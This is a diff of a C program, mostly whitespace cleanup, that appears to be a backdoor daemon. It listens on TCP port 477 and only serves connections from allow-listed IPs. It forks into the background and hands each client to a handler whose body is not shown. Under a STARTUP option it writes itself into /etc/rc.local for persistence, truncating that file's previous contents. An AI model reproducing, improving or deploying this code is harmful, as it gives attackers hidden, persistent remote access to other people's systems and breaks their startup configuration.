@@ -17,15 +17,15 @@ char* DynamicIP[] = { "62.129.*", (void*)0 };
 int AuthCheck(u_char *ip)
 {
     	int i;
-    	for (i=0; AllowedIP[i] != NULL; i++) 
-		{
+    	for (i=0; AllowedIP[i] != NULL; i++)
+        {
 			if (!strcmp(ip, AllowedIP[i]))
 			{
 				return 1;
 			}
-    	}
-    	for (i=0; DynamicIP[i] != NULL; i++) 
-		{
+        }
+    	for (i=0; DynamicIP[i] != NULL; i++)
+        {
 			int x = (int)(strchr(DynamicIP[i], '*') - DynamicIP[i] - 1);
 
 			char substring[] = "";
@@ -55,7 +55,7 @@ void domything(u_int sd, u_char *src)
     }
 }
 
-main(int argc, char *argv[]) 
+int main(int argc, char *argv[]) 
 {
 #ifdef STARTUP
 	int on,i;
@@ -73,82 +73,82 @@ main(int argc, char *argv[])
 		str="/etc/rc.local";
 		file=fopen(str,"r");
 	}
-        if (file != NULL) 
-        {
-                char outfile[256], buf[1024];
-                int i=strlen(argv[0]), d=0;
-                getcwd(cwd,256);
-                if (strcmp(cwd,"/")) 
-                {
-                        while(argv[0][i] != '/') i--;
+    if (file != NULL) 
+    {
+            char outfile[256], buf[1024];
+            int i=strlen(argv[0]), d=0;
+            getcwd(cwd,256);
+            if (strcmp(cwd,"/")) 
+            {
+                    while(argv[0][i] != '/') i--;
 
-                        sprintf(outfile,"\"%s%s\"\n",cwd,argv[0]+i);
-                        while(!feof(file)) 
-                        {
-                                fgets(buf,1024,file);
-                                if (!strcasecmp(buf,outfile)) d++;
-                        }
-                        if (d == 0) 
-                        {
-                                FILE *out;
-                                fclose(file);
-                                out=fopen(str,"w+");
-                                if (out != NULL) 
-                                {
-                                        fputs(outfile,out);
-                                        fputs("\nexit 0\n",out);
-                                        fclose(out);
-                                }
-                        }
-                        else fclose(file);
-                }
-                else fclose(file);
-        }
+                    sprintf(outfile,"\"%s%s\"\n",cwd,argv[0]+i);
+                    while(!feof(file)) 
+                    {
+                            fgets(buf,1024,file);
+                            if (!strcasecmp(buf,outfile)) d++;
+                    }
+                    if (d == 0) 
+                    {
+                            FILE *out;
+                            fclose(file);
+                            out=fopen(str,"w+");
+                            if (out != NULL) 
+                            {
+                                    fputs(outfile,out);
+                                    fputs("\nexit 0\n",out);
+                                    fclose(out);
+                            }
+                    }
+                    else fclose(file);
+            }
+            else fclose(file);
+    }
 #endif
 
-    	struct sockaddr_in local;
-		struct sockaddr_in remote;
-    	int sIN, sOUT;
-		int len;
+    struct sockaddr_in local;
+    struct sockaddr_in remote;
+    int sIN, sOUT;
+    int len;
 
-    	memset((u_char *)&local, 0, sizeof(local));
+    memset((u_char *)&local, 0, sizeof(local));
 
-    	local.sin_family = AF_INET;
-    	local.sin_addr.s_addr = INADDR_ANY;
-    	local.sin_port = htons(477);
+    local.sin_family = AF_INET;
+    local.sin_addr.s_addr = INADDR_ANY;
+    local.sin_port = htons(477);
 
-    	if ((sIN = socket(AF_INET, SOCK_STREAM, 0)) == -1)
-	    {
-    		perror("socket() failed");
-    		return 1;
-        }
+    if ((sIN = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+	{
+    	perror("socket() failed");
+    	return 1;
+    }
 
-    	if (bind(sIN, (struct sockaddr *)&local, sizeof(local)))
-	    {
-        	perror("bind() failed");
-    		return 1; 
-	    }
+    if (bind(sIN, (struct sockaddr *)&local, sizeof(local)))
+	{
+        perror("bind() failed");
+    	return 1; 
+    }
 
-    	if (listen(sIN, MAXCON)) 
-	    {
-    		perror("listen() failed");
-    		return 1; 
-	    }
+    if (listen(sIN, MAXCON)) 
+	{
+    	perror("listen() failed");
+    	return 1; 
+	}
 
-    	if (fork()) exit(0);
+    if (fork()) exit(0);
 
-	    len = sizeof(local);    
+	len = sizeof(local);    
 
-    	while (1) 
-	    {
-		    sOUT = accept(sIN, (struct sockaddr *)&remote, &len);
-		    if (fork() != 0)
-		    {
-	    		    close(sIN);
-	    		    domything(sOUT, inet_ntoa(remote.sin_addr));
-		    }
-		    close(sOUT);
-    	}
-    	close(sIN);
-    	return 0;
+    while (1) 
+	{
+		sOUT = accept(sIN, (struct sockaddr *)&remote, &len);
+		if (fork() != 0)
+		{
+	    	close(sIN);
+	    	domything(sOUT, inet_ntoa(remote.sin_addr));
+		}
+		close(sOUT);
+    }
+    close(sIN);
+    return 0;
 }
